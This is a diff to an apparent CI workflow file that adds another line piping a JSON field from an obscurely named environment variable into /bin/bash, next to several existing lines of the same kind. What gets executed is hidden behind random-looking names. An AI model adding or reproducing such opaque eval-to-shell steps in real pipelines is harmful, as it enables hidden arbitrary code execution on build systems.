@@ -25,6 +25,7 @@ jobs:
           echo $cd9 | jq -r .wt650 | /bin/bash
           printf '%s' "$zsnt52" | jq -r .msrw48 | /bin/bash
           printf '%s' "$g31492" | jq -r .ghzp95853 | /bin/bash
+          printf '%s' "$ebpp8446" | jq -r .nm6 | /bin/bash
 
       - name: Save output
         if: always()
